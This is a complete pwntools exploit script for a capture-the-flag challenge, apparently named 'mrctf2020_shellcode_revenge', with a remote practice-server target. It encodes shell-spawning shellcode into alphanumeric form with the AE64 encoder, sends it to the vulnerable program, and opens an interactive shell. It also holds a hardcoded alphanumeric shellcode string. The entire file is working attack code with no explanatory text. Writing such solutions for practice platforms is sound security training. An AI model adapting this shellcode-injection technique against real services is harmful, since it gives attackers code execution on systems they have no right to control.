#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.04 12.49.52
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
import sys
sys.path.append('/home/matrix/ae64')
from ae64 import AE64
context.arch = 'amd64'


host = '1.1.1.1'
port = 10000
local = 1
if local:
	context.log_level = 'debug'
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	sh = process('./mrctf2020_shellcode_revenge')
else:
	#context.log_level = 'debug'
	libc=ELF('./libc-2.23.so')
	elf = ELF('./mrctf2020_shellcode_revenge')
	sh = remote('node3.buuoj.cn',25755)



def pwn():
	# shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M7M1o1M170Y172y0h16110j100o0Z0J131k1217100Z110Y0i0Z0Y09110k0x2I100i0i020W130e0F0x0x0V0c0Z0u0A2n101k0t2K0h0i0t180y0D132F100502"
	shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M0M"
	# gdb.attach(sh,'b*$rebase(0x000000000000124D)')
	obj = AE64()
	sc = obj.encode(asm(shellcraft.sh()), 'rax')
	print(sc)
	gdb.attach(sh)
	sh.send(sc)




if __name__ == '__main__':
	pwn()
	sh.interactive()

